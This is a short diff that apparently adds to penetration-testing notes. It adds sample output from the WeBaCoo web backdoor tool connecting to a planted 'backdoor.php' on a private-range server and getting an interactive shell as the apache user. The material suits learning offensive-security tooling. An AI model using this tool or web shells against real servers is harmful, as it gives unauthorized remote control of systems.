@@ -179,4 +179,17 @@ backdoor.php
 
 ```
 $ webacoo -t -u http://192.168.yyy.zzz/backdoor.php
+
+        WeBaCoo 0.2.3 - Web Backdoor Cookie Script-Kit
+        Copyright (C) 2011-2012 Anestis Bechtsoudis
+        { @anestisb | anestis@bechtsoudis.com | http(s)://bechtsoudis.com }
+
+[+] Connecting to remote server as...
+uid=48(apache) gid=48(apache) groups=48(apache) context=unconfined_u:system_r:httpd_t:s0
+
+[*] Type 'load' to use an extension module.
+[*] Type ':<cmd>' to run local OS commands.
+[*] Type 'exit' to quit terminal.
+
+webacoo$ 
 ```
